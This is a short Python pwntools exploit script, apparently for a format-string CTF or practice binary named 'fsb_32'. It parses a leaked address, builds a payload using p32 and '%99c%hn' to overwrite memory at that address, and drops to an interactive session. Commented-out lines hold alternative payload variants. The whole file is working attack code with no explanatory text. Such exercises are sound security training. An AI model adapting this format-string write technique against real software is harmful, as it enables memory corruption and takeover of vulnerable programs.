from pwn import *

p = process("./fsb_32")

p.recvuntil("addr is : ")
addr = int(p.recvline()[:-1],16)

print hex(addr)

payload = "aaaa"     #1
payload +=  p32(addr) #2
payload += "%99c"    #3
payload += "%hn "    #4 
# payload +=  p32(addr+2) #4
# payload += "%x%x" #5
# payload += "%hn "   #6

# payload =  p32(addr)
# payload += "aaaa"
# payload += p32(addr+2)
# payload += "%hn "
# payload += "%x%x"

# payload += "bbbb"
# payload += "%x"*4
pause()
p.sendlineafter("fsb now!>>",payload)

p.interactive()